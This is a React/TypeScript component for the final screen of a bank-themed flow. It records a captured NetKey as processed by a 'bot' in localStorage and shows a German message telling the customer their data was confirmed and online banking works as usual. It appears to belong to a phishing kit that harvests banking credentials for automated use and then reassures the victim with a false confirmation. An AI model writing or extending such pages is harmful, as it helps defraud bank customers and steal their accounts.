import { useEffect } from "react";
import type { FlowTheme } from "./BankShell";

export function CompletionStep({
  theme: _theme,
  customerName,
  taskId,
}: {
  theme: FlowTheme;
  customerName: string;
  taskId?: string;
}) {
  const firstName = customerName ? customerName.split(" ")[0] : "";

  // Mark this NetKey as "already processed" so the login form blocks re-runs
  // on this device. The login route reads `bot_done:<netkey>` from
  // localStorage before starting a new task.
  useEffect(() => {
    if (!taskId) return;
    try {
      const netkey = sessionStorage.getItem(`bot_netkey_${taskId}`);
      if (netkey) {
        localStorage.setItem(`bot_done:${netkey.toLowerCase()}`, String(Date.now()));
      }
    } catch {}
  }, [taskId]);

  return (
    <main className="flex-1 flex items-center justify-center px-4">
      <div className="w-full max-w-md text-center">
        <div className="bg-green-50 rounded-2xl p-8 sm:p-10 mb-6">
          <div className="w-14 h-14 mx-auto mb-5 rounded-full border-[3px] border-green-600 flex items-center justify-center">
            <svg
              className="w-7 h-7 text-green-600"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={2.5}
            >
              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
            </svg>
          </div>
          <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-3">
            Vielen Dank{firstName ? `, ${firstName}` : ""}!
          </h2>
          <p className="text-sm sm:text-base text-gray-700 leading-relaxed">
            Ihre Daten wurden erfolgreich bestätigt und Ihre Geräteverwaltung aktualisiert.
            Sie können Ihr Online-Banking wie gewohnt nutzen.
          </p>
        </div>
      </div>
    </main>
  );
}
